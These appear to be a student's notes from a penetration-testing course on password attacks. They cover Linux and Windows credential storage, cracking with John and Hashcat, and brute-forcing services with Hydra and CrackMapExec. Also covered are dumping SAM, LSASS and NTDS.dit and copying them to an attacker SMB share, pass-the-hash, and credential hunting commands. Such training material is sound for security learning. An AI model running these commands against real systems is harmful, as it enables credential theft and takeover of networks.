# Credential Storage in Linux
- **Credential Storage**: Authentication mechanisms store credentials locally or in databases. Web apps are vulnerable to SQL injections, potentially exposing plaintext data.
- **Common Password Wordlists**: Example - `rockyou.txt`, created after the RockYou breach (32M accounts stored in plaintext).

### Linux Credential Storage
- **Password Storage**: Located in `/etc/shadow`, part of Linux user management.
- **Password Format**: Usually stored as hashes.

### `/etc/shadow` File Structure
- **File Location**: `/etc/shadow`
- **Example Entry**:

![image](https://github.com/user-attachments/assets/a94bf53d-a0ed-44a6-bede-5089a6f1cbd1)


### Password Encryption Format
- **General Format**: `$<id>$<salt>$<hashed password>`
- Example: `$ y	$ j9T	$ 3QSBB6CbHEu...SNIP...f8Ms`

### Cryptographic Hash Algorithms
| ID    | Algorithm         |
|-------|-------------------|
| $1$   | MD5               |
| $2a$  | Blowfish          |
| $5$   | SHA-256           |
| $6$   | SHA-512           |
| $sha1$| SHA1crypt         |
| $y$   | Yescrypt          |
| $gy$  | Gost-yescrypt     |
| $7$   | Scrypt            |

### Additional User Management Files
1. **`/etc/passwd`**
   ![image](https://github.com/user-attachments/assets/31fb511b-1a52-4bc2-b700-b7e1e37943da)

 - Previously stored encrypted passwords; now only accessible by root.
 - **Format**: `<username>:x:<uid>:<gid>:<comment>:<home directory>:<cmd after login>`
 - The `x` indicates the password is in `/etc/shadow`.

2. **`/etc/group`**
 - Manages group information.


### Security Note
- **Permissions Matter**: Incorrect `/etc/shadow` file permissions can lead to root user login vulnerabilities without a password.

## Windows Authentication Process

- **Windows Authentication** involves complex modules for logon, retrieval, and verification (e.g., Kerberos).
- **Local Security Authority (LSA)**: Authenticates users, maintains local security info, manages security IDs (SIDs), and checks access permissions.
- **Domain Controllers**: Store security policies and accounts in Active Directory for centralized management.

### Key Components
1. **Winlogon**
   - Manages security-related user interactions (login, password changes, workstation locking).
   - Uses **Credential Providers** (COM objects in DLLs) to obtain login details.
   - **LogonUI**: Displays login interface and gathers credentials.

2. **LSASS (Local Security Authority Subsystem Service)**
   - Located at `%SystemRoot%\System32\Lsass.exe`.
   - Manages local security policies, user authentication, and security audit logs.
   - **Authentication Packages**:
     | Package       | Description                                            |
     |---------------|--------------------------------------------------------|
     | `Lsasrv.dll`  | Enforces security policies; manages security packages. |
     | `Msv1_0.dll`  | Handles non-domain logins.                             |
     | `Samsrv.dll`  | Manages local security accounts.                       |
     | `Kerberos.dll`| Handles Kerberos-based authentication.                 |
     | `Netlogon.dll`| Network-based logon service.                           |
     | `Ntdsa.dll`   | Manages Windows registry records.                      |

### SAM Database
- **Location**: `%SystemRoot%\system32\config\SAM`, mounted at `HKLM/SAM`.
- **Role**: Stores user passwords in hash format (LM/NTLM). Requires SYSTEM permissions for access.
- **Workgroup vs. Domain**:
  - **Workgroup**: SAM handles credentials locally.
  - **Domain**: Domain Controller validates credentials using the Active Directory database (`ntds.dit`).

### NTDS.dit
- **Active Directory Database** stored at `%SystemRoot%\ntds.dit`.
- **Contents**: User accounts (username & password hash), group accounts, computer accounts, and group policy objects.
- **Synchronization**: NTDS.dit is synced across Domain Controllers (excluding Read-Only Domain Controllers).

### Credential Manager
- **Role**: Saves credentials for network resources and websites, encrypted in the **Credential Locker**.
- **Storage Location**: 
PS C:\Users[Username]\AppData\Local\Microsoft[Vault/Credentials]\

- **Decryption Methods**: Various tools and techniques can decrypt stored credentials.

### Security Features
- **SYSKEY (Windows NT 4.0)**: Partially encrypts the SAM database to protect password hashes from offline attacks.

### NTDS (Network Directory Services)
- **Domain Environment**: Common in networks where Windows systems are joined to a domain.
- **Logon Requests**: Sent to Domain Controllers within the same Active Directory forest.
- **NTDS.dit File**: Stores various Active Directory data, such as:
- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects

# John the Ripper (JTR)
- **JTR** is a popular open-source tool for testing password strength and cracking encrypted passwords using brute force or dictionary attacks.
- Initially developed for UNIX-based systems (1996), it is widely used in the security field.
- The "Jumbo" variant includes optimizations, multilingual wordlists, and support for 64-bit systems.

## Supported Encryption Technologies
- **UNIX crypt(3)**: Traditional UNIX encryption with a 56-bit key.
- **DES-based**: Uses the Data Encryption Standard.
- **Blowfish-based**: 448-bit key encryption.
- **SHA-crypt hashes**: Commonly used in modern Linux distributions.
- **Windows LM**: Uses a 56-bit key for encryption.
- **And many more**: Supports a wide range of encryption formats.

## Attack Methods
1. **Dictionary Attacks**:
   - Uses a pre-generated list of words to compare against hashed passwords.
   - Common and effective but requires comprehensive wordlists.
2. **Brute Force Attacks**:
   - Attempts every possible combination of characters.
   - Time-consuming, especially for long or complex passwords.
3. **Rainbow Table Attacks**:
   - Uses precomputed hash-password pairs for quick lookup.
   - Limited by the size of the rainbow table.

## Cracking Modes
1. **Single Crack Mode**:
   - Uses built-in wordlist or user-specified rules.
   - Basic but less efficient for complex passwords.
   - Command example:
   - ```
     john --format=<hash_type> <hash_file>
     ```
     ## Cracking with John
   - Supports various hash formats, e.g.,
  ```
  john --format=sha256 hashes_to_crack.txt`.
  ```
   - Outputs cracked passwords to "john.pot" in the user's home directory.
   - Progress can be viewed with `john --show`.
![image](https://github.com/user-attachments/assets/5a5c0ab1-6829-4b8c-8935-6f87483f775c)

2. **Wordlist Mode**:
   - Cracks passwords using one or more wordlists.
   - Allows applying mangling rules to modify words in the list.
   - Command example:
   - ```
     john --wordlist=<wordlist_file> --rules <hash_file>
     ```



 3. Incremental Mode in John
   - **Command:** `john --incremental <hash_file>`
     - Reads the hashes from the specified file and generates all possible character combinations, incrementing the length with each iteration.
     - **Resource-Intensive:** Takes a long time to complete, depending on password complexity and system performance.
     - **Character Set:** Default is `a-zA-Z0-9`. For complex passwords with special characters, a custom character set is needed.

### Cracking Files with John
It is also possible to crack even password-protected or encrypted files with John. We use additional tools that process the given files and produce hashes that John can work with. It automatically detects the formats and tries to crack them.

```

pdf2john server_doc.pdf > server_doc.hash
 john server_doc.hash
```
```
 john --wordlist=<wordlist.txt> server_doc.hash
```
![image](https://github.com/user-attachments/assets/58c7507c-0f88-4090-baf8-7f87df75cc81)

locate more tools

```
locate *2john*
```
# Network Services

- During penetration tests, networks have various services to manage, edit, or create content, hosted with specific permissions.
- Common services include:
  - **FTP** - **SMB**  - **NFS** - **IMAP/POP3** - **SSH** - **MySQL/MSSQL** - **RDP** - **WinRM** - **VNC** - **Telnet**- **SMTP**- **LDAP**

### Managing Windows Server
- To manage a Windows server remotely, use services like:
  - **RDP** (Remote Desktop Protocol)
  - **WinRM** (Windows Remote Management)
  - **SSH** (less common on Windows)

- All services typically require authentication (username and password), though they can be configured for key-based access.

### WinRM
- **Definition:** Windows Remote Management (WinRM) is the Microsoft implementation of the WS-Management protocol.
- **Protocol Type:** Based on XML web services using SOAP for remote management.
- **Communication:** Interfaces with WBEM and WMI, can invoke DCOM.
- **Configuration:** Must be manually activated on Windows 10; depends on security settings in the environment.
- **Ports Used:** 
  - **TCP 5985** (HTTP)
  - **TCP 5986** (HTTPS)

### CrackMapExec
- **Purpose:** Tool for password attacks, also supports SMB, LDAP, MSSQL, etc.
- **Installation Command:**  
  ```bash
  sudo apt-get -y install crackmapexec
  ```
**CrackMapExec Menu Options**
```
crackmapexec -h
```

**CrackMapExec Protocol-Specific Help**

```
crackmapexec smb -h
```

**CrackMapExec Usage**
```
crackmapexec winrm 10.129.42.197 -u user.list -p password.list`
```
![image](https://github.com/user-attachments/assets/970fcdc5-c6e6-4b6a-b643-3f73d912fa8f)
The appearance of (Pwn3d!) is the sign that we can most likely execute system commands if we log in with the brute-forced user. 

Communicate with the WinRM service is Evil-WinRM

### Evil-WinRM

**Installing Evil-WinRM**

```
sudo gem install evil-winrm
```
**Evil-WinRM Usage**

```
 evil-winrm -i 10.129.42.197 -u user -p password
```

### SSH (Secure Shell)
- **Definition:** A secure method to connect to remote hosts for executing commands or transferring files.
- **Default Port:** TCP port **22**.
- **Encryption Methods:**
  - **Symmetric Encryption:** Same key for encryption and decryption. Requires a key exchange (e.g., Diffie-Hellman). Common ciphers include AES, Blowfish, and 3DES.
  - **Asymmetric Encryption:** Uses a private key (kept secret) and a public key. The server uses the public key for authentication; the client decrypts messages with the private key.
  - **Hashing:** Converts transmitted data into a unique value to confirm authenticity.

### Hydra for SSH
- **Command to brute-force SSH:**
  ```bash
  hydra -L user.list -P password.list ssh://10.129.42.197
  ```
Login to SSH

```
 ssh user@10.129.42.197
```
### RDP
- Definition: Microsoft's protocol for remote access to Windows systems.
- Default Port: TCP port 3389.
- Features:
   Allows remote access to Windows hosts.
   Supports audio, keyboard, mouse input, and document printing.
   Application layer protocol using TCP and UDP.

**Hydra for RDP**
```
hydra -L user.list -P password.list rdp://10.129.42.197
```

**XFreeRdp**

```
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```
### Server Message Block (SMB)

- **Purpose**: Protocol for transferring data between client and server in local area networks.
- **Uses**:
  - File and directory sharing
  - Printing services in Windows networks
- **Comparison**: Similar to NFS for Unix/Linux for local network drives.
- **Also Known As**: Common Internet File System (CIFS).
- **Compatibility**: Enables remote connections across platforms (Windows, Linux, macOS).
- **Open Source Implementation**: Samba.
- **Brute Forcing Tool**: Hydra can be used to attempt different usernames and passwords with SMB.

**Hydra - SMB**

```
hydra -L user.list -P password.list smb://10.129.42.197
```
you may get an error rThis is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.

**Metasploit Framework**

```
msfconsole -q
use auxiliary/scanner/smb/smb_login
```
then set the wordlist and for both user and pass to bruteforce.

Now we can use CrackMapExec again to view the available shares and what privileges we have for them.

**CrackMapExec**

```
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```

use smbclient to communicate

**Smbclient**
```
smbclient -U user \\\\10.129.42.197\\SHARENAME
```
# Password Mutations

- **Purpose**: Enhance security by enforcing password complexity through policies.
- **Common Password Policies**:
  - Minimum length: 8 characters
  - Must include: 
    - Capital letters
    - Special characters
    - Numbers

- **Weak Password Patterns**:
  - Users often create passwords related to their interests or company names.
  - Common additions for weak passwords:
    - First letter uppercase: `Password`
    - Adding numbers: `Password123`
    - Adding year: `Password2022`
    - Adding month: `Password02`
    - Last character as exclamation mark: `Password2022!`
    - Adding special characters: `P@ssw0rd2022!`

- **Password Length Statistics**: 
  - Most passwords are not longer than 10 characters.
  
- **Example of Password Creation**:
  - Combining a single word with the current year and a special character can meet complexity requirements (e.g., `January2022!`).

### Password List Example

We can use a very powerful tool called Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. 

![image](https://github.com/user-attachments/assets/85190865-3329-4241-8228-d3c84b6ad42c)

![image](https://github.com/user-attachments/assets/d29d9ebc-bc78-4274-a223-8351ae294bcd)

Each rule is written on a new line which determines how the word should be mutated.

### Hashcat Rule File
store the below into a file eg. custom.rule
```
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

Hashcat will apply the rules of custom.rule for each word in password.list and store the mutated version in our mut_password.list 
### Generating Rule-based Wordlist
```
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
cat mut_password.list
```
Hashcat and John come with pre-built rule lists that we can use for our password generating and cracking purposes. One of the most used rules is best64.rule, which can often lead to good results. 
Here’s a condensed version of the text without bullet points:

Password cracking is primarily a guessing game, but it can become more effective with targeted guessing. By understanding the password policy and considering factors like the company name, geographical region, and industry-specific terms, one can tailor the approach to better align with users' likely choices. Exceptions occur when passwords are leaked, providing direct insight into potential passwords.

**Hashcat Existing Rules**

```
 ls /usr/share/hashcat/rules/
```
### Generating Wordlists Using CeWL
We can now use another tool called CeWL to scan potential words from the company's website and save them in a separate list. specify some parameters, like the depth to spider (-d), the minimum length of the word (-m), the storage of the found words in lowercase (--lowercase), as well as the file where we want to store the results (-w).

```
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
wc -l inlane.wordlist
```
# Password Reuse / Default Passwords

## Default Credentials and Credential Stuffing

- **Common Issues**:
  - Users and administrators often leave default credentials in place, forgetting to change them after installation.
  - Easy-to-remember passwords are frequently reused, especially in large infrastructures with many interfaces.

- **Credential Stuffing**:
  - Involves using known default credentials to access services.
  - Simpler than brute-forcing as it uses composite usernames and passwords from known lists.

- **Default Credential Sources**:
  - Common databases like the [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) list known default credentials for various products.

Default credentials can also be found in the product documentation, as they contain the steps necessary to set up the service successfully. Some devices/applications require the user to set up a password at install, but others use a default, weak password. Attacking those services with the default or obtained credentials is called Credential Stuffing.  we can create a new list that separates these composite credentials with a colon (username:password). In addition, we can select the passwords and mutate them by our rules to increase the probability of hits.

- **Hydra Usage for Credential Stuffing**:
- Create a list of composite credentials (username:password).
- Use the following Hydra syntax to perform credential stuffing:
  ```bash
  hydra -C <user_pass.list> <protocol>://<IP>
  ```
- Example for SSH:
  ```bash
  hydra -C user_pass.list ssh://10.129.42.197
  ```

- **Role of OSINT**:
- Helps understand company structure and infrastructure for better password and username combinations.
- Useful for identifying hardcoded credentials in applications via Google searches.

**Google Search - Default Credentials**
![image](https://github.com/user-attachments/assets/f862824f-cf47-4c33-a32a-692371b1c6b5)

In addition to application default credentials, there are [lists](https://www.softwaretestinghelp.com/default-router-username-and-password-list/) available specifically for routers. However, it's less common for router default credentials to remain unchanged since administrators usually prioritize securing these central network interfaces.

# Attacking SAM

With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline. 

## Copying SAM Registry Hives

There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. 

![image](https://github.com/user-attachments/assets/77ba71ad-a7f8-45a1-bad4-105e7cbb0bc4)

### Using reg.exe save to Copy Registry Hives
```
reg.exe save hklm\sam C:\sam.save
```
```
reg.exe save hklm\system C:\system.save
```
```
reg.exe save hklm\security C:\security.save
```
Technically we will only need hklm\sam & hklm\system, but hklm\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts. Once the hives are saved offline, we can use various methods to transfer them to our attack host. 
### Creating a Share with smbserver.py
All we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the directory on our attack host where the share will be storing the hive copies (/home/ltnbob/Documents). 
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

use move command to move copies to share

### Moving Hive Copies to Share

```
move sam.save \\10.10.15.16\CompData
```

## Dumping Hashes with Impacket's secretsdump.py
 tool we can use to dump the hashes offline is Impacket's secretsdump.py

 ### Locating secretsdump.py
 ```
locate secretsdump
```
### Running secretsdump.py
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
Secretsdump successfully dumps the local SAM hashes and would've also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. Notice the first step secretsdump executes is targeting the system bootkey before proceeding to dump the LOCAL SAM hashes. It cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database.

Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS.

## Cracking Hashes with Hashcat

### Adding nthashes to a .txt File
```
sudo vim hashestocrack.txt
```
### Running Hashcat against NT Hashes
Selecting a mode is largely dependent on the type of attack and hash type we want to crack. We will focus on using -m to select the hash type 1000 to crack our NT hashes. (use hashcat page to find other hash types and their number)
```
 sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
We can see from the output that Hashcat used a type of attack called a dictionary attack to rapidly guess the passwords utilizing a list of known passwords (rockyou.txt) and was successful in cracking 3 of the hashes.  It is very common for people to re-use passwords across different work & personal accounts.

### Remote Dumping & LSA Secrets Considerations
With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.

**Dumping LSA Secrets Remotely**

```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
**Dumping SAM Remotely**

```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
# Attacking LSASS
 LSASS is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems.

Upon initial logon, LSASS will:

Cache credentials locally in memory
Create access tokens
Enforce security policies
Write to Windows security log

## Dumping LSASS Process Memory
Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. 

There are many techniques to create memory dump.

### Task Manager Method
Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file

lsass.DMP is created and saved in:
```
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```
use the file transfer method discussed in the Attacking SAM

### Rundll32.exe & Comsvcs.dll Method
use an alternative method to dump LSASS process memory through a command-line utility called rundll32.exe. It is important to note that modern anti-virus tools recognize this method as malicious activity.

determine what process ID (PID) is assigned to lsass.exe.
**Finding LSASS PID in cmd**

```
tasklist /svc
```
**Finding LSASS PID in PowerShell**
```
Get-Process lsass
```

**Creating lsass.dmp using PowerShell**
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp).

If the lsass.dmp file is generated we transfer it to attack host and extract the creds.


### Using Pypykatz to Extract Credentials

we can use a powerful tool called pypykatz to attempt to extract credentials from the .dmp file. Pypykatz is an implementation of Mimikatz written entirely in Python.Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host. When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. 

**Running Pypykatz**
The command initiates the use of pypykatz to parse the secrets hidden in the LSASS process memory dump. We use lsa in the command because LSASS is a subsystem of local security authority, then we specify the data source as a minidump file, proceeded by the path to the dump file (/home/peter/Documents/lsass.dmp) stored on our attack host. 
```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```
We will get an output

**MSV** MSV is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database.Pypykatz extracted the SID, Username, Domain, and even the NT & SHA1 password hashes associated with the bob user account's logon session stored in LSASS process memory. 

**WDIGEST** - WDIGEST is an older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 - Windows Server 2012. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text

**Kerberos** - Kerberos is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos. 

**DPAPI** - The Data Protection Application Programming Interface or DPAPI is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications.Mimikatz and Pypykatz can extract the DPAPI masterkey for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. 
## Cracking the NT Hash with Hashcat

```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

# Attacking Active Directory & NTDS.dit

- **Definition**: Critical directory service in enterprise networks, primarily for managing Windows systems.
- **Importance**: Extensive topic; multiple modules cover attacking and defending AD environments.


## Attack Prerequisites

- **Network Reachability**: Target must be accessible over the network.
- **Internal Foothold**: Typically requires initial compromise to access the internal network.
- **Remote Access**: Organizations may use port forwarding (e.g., RDP on port 3389) to access internal systems.

### Authentication Process

- Once a Windows system is joined to a domain, it sends all authentication requests to the domain controller, rather than using the SAM database by default.
- Local account logon is still possible by specifying the hostname (e.g., `WS01/nameofuser`) or using `./` at the logon UI.
- This is important for understanding which system components are affected by attacks and may provide additional avenues for targeting Windows systems, both with physical access and over the network.
- Awareness of this technique aids in studying NTDS attacks.

## Dictionary Attacks against AD accounts using CrackMapExec
Keep in mind that a dictionary attack is essentially using the power of a computer to guess a username &/or password using a customized list of potential usernames and passwords. It can be rather noisy (easy to detect) to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of Group Policy.

consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company's website. Doing this can result in us gaining the names of employees that work at the organization. One of the first things a new employee will get is a username.  Organisations follow a naming convention.

an email address's structure will give us the employee's username (structure: username@domain). For example, from the email address jdoe@inlanefreight.com, we see that jdoe is the username. Google the domain name , i.e., “@inlanefreight.com” can get some valid emails.

### Creating a Custom list of Usernames
Create a custom list yourself using the usual convention like the example below.( name - Ben Williamson )
![image](https://github.com/user-attachments/assets/74060651-89ed-46f2-962a-30eb7638f8b5)

Use automated username generator such as the Ruby-based tool Username Anarchy to convert a list of real names into common username formats. 
```
./username-anarchy -i /home/ltnbob/names.txt
```

### Launching the Attack with CrackMapExec
Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch our attack against the target domain controller using a tool such as CrackMapExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. 
```
 crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
CrackMapExec is using SMB to attempt to logon as user (-u) bwilliamson using a password (-p) list containing a list of commonly used passwords (/usr/share/wordlists/fasttrack.txt). This can be countered by account lockout policy. (default it is not enforced)

**Event Logs from the Attack**
It can be useful to know what might have been left behind by an attack. Knowing this can make our remediation recommendations more impactful and valuable for the client we are working with. On any Windows operating system, an admin can navigate to Event Viewer and view the Security events to see the exact actions that were logged. 

Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.

## Capturing NTDS.dit

NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM section. 

### Connecting to a DC with Evil-WinRM
```
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```
### Checking Local Group Membership
check to see what privileges bwilliamson has
```
net localgroup
```
To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights.
### Checking User Account Privileges including Domain
```
net user bwilliamson
```
This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.

## Creating Shadow Copy of C:
We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. 
```
vssadmin CREATE SHADOW /For=C:
```
### Copying NTDS.dit from the VSS
copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.

```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
use the technique from attacking sam to create an SMB share on our attack host.
### Transferring NTDS.dit to Attack Host
```
 cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
 ```
## A Faster Method: Using cme to Capture NTDS.dit
sing CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.
```
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
## Cracking Hashes & Gaining Credentials

### Cracking a Single Hash with Hashcat
```
 sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
if crack unsuccessful use pass the hash technique.
## Pass-the-Hash Considerations
We can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash (PtH). A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash. Instead of username:clear-text password as the format for login

### Pass-the-Hash with Evil-WinRM Example
```
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

# Credential Hunting in Windows
Credential Hunting is the process of performing detailed searches across the file system and through various applications to discover credentials. 

## Search Centric
A user may have documented their passwords somewhere on the system. There may even be default credentials that could be found in various files. It would be wise to base our search for credentials on what we know about how the target system is being used.

### Key Terms to Search
![image](https://github.com/user-attachments/assets/89344284-8cb1-4290-b527-7e06c2240c07)

## Search Tools
It is worth attempting to use Windows Search and use the keywords mentioned.
By default, it will search various OS settings and the file system for files & applications containing the key term entered in the search bar.

Take advantage of third-party tools like Lazagne to quickly discover credentials that web browsers or other installed applications may insecurely store.
It would be beneficial to keep a standalone copy of Lazagne on our attack host so we can quickly transfer it over to the target. Lazagne.exe will do just fine for us in this scenario.
### Install lazagne
```
wget https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
```
### Running Lazagne All
```
lazagne.exe all
```
```
C:\Users\example\Desktop\lazagne.exe all
```
-vv to study what it is doing in the background.
### Using findstr
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Key Considerations
- **OS Type**: Approach differs for Windows Server vs. Windows Desktop.
- **System Function**: Tailor your search based on the computer's role.
- **Directory Navigation**: List directories to potentially uncover credentials.

### Common Storage Locations for Credentials
- **Group Policy**:
  - Passwords in the SYSVOL share
  - Scripts in the SYSVOL share

- **IT Shares**:
  - Passwords in scripts
  - `web.config` files on development machines and IT shares

- **Configuration Files**:
  - `unattend.xml`

- **Active Directory**:
  - User or computer description fields

- **Password Management**:
  - KeePass databases (pull hash, crack for access)

- **User Systems**:
  - Look for files like:
    - `pass.txt`
    - `passwords.docx`
    - `passwords.xlsx`
  - Check user shares and SharePoint.

# Credential Hunting in Linux
- **Purpose**: Part of local privilege escalation to find credentials that can help in gaining elevated privileges on the target system.

## Categories to Check
### 1. Files
- **Configuration Files**: Search for `.conf`, `.config`, `.cnf` files; they may contain credentials.
    ```bash
    for l in $(echo ".conf .config .cnf"); do find / -name *$l 2>/dev/null; done
    ```
- **Scripts**: May store hardcoded credentials for automation.
  ```
  for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
  ```
- **Databases**: Files like `.db`, `.sql` can contain sensitive information.
  ```
  for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
  ```
- **Notes**: Look for `.txt` files or files without extensions that may contain plaintext credentials.
    ```bash
    find /home/* -type f -name "*.txt" -o ! -name "*.*"
    ```

### 2. Command-line History
- Check history files (`~/.bash_history`, `~/.zsh_history`) for passwords used in commands.

### 3. Memory
- Dump memory or inspect running processes to find sensitive information.

### 4. Key-Rings and SSH Keys
- Look in common SSH key locations (`~/.ssh/`) for private keys.

## Searching Techniques
- **Grep for keywords**:
    ```bash
    grep "user\|password\|pass" /path/to/file
    ```
- **Find databases**:
    ```bash
    find / -name "*.db" 2>/dev/null
    ```

## Notes
- Adapt the approach based on the system's role, purpose, and environment.
- Focus on reducing the scope to files and directories most likely to contain sensitive information.


## 1. Cronjobs
- **Definition**: Cronjobs are scheduled tasks that run commands, scripts, or programs automatically at specified times.
- **Types**:
  - **System-wide Cronjobs**: Located in `/etc/crontab`, these tasks apply to the whole system and do not need a specific `crontab` command to update.
  - **User-based Cronjobs**: Each user can define their own scheduled tasks.
- **Time Ranges**:
  - `/etc/cron.daily` - Executes daily tasks.
  - `/etc/cron.hourly` - Executes hourly tasks.
  - `/etc/cron.monthly` - Executes monthly tasks.
  - `/etc/cron.weekly` - Executes weekly tasks.
- **Potential Issue**: Credentials are sometimes embedded in cronjob scripts, exposing sensitive information.
- **Search Locations**:
  - `/etc/cron.d/` contains system-wide cron jobs.
  - Use
  ```
    ls -la /etc/cron.*
  ```
to list cron directories and their contents.

## 2. SSH Keys
- **Definition**: SSH keys are used for secure authentication in the SSH protocol. They come in pairs: public and private keys.
  - **Private Key**: Should remain secret and allows access to a server.
  - **Public Key**: Can be shared, used to verify access, but cannot be used to derive the private key.
- **Potential Issue**: Private keys may be stored in insecure locations, exposing them to unauthorized access.
- **Search Commands**:
  - To find private keys:
```
    grep -rnw "PRIVATE KEY" /home/* 2>/dev/null`
```
  - To find public keys:
    ```
    grep -rnw "ssh-rsa" /home/* 2>/dev/null
    ```
- **Example Output**:
  - `/home/username/.ssh/id_rsa:1:-----BEGIN OPENSSH PRIVATE KEY-----`

## 3. Bash History
- **Definition**: Command history is stored in files like `.bash_history` and logs commands executed by users.
- **Potential Issue**: Sensitive commands containing passwords or secret keys may be logged.
- **Search Files**:
  - `.bash_history` records past command-line inputs.
  - `.bashrc` and `.bash_profile` may include commands that run on shell startup.
- **Command Example**:
  - `tail -n5 /home/*/.bash*` to view the last few commands executed.
- **Sample Output**:
vim ~/passwords.txt chmod 600 ~/.ssh/id_rsa

## 4. Logs
- **Definition**: Logs record system events and are stored in various files in `/var/log/`.
- **Log Categories**:
- **Application Logs**: Logs generated by applications (e.g., `/var/log/httpd` for Apache).
- **Event Logs**: Record user actions (e.g., `/var/log/auth.log`).
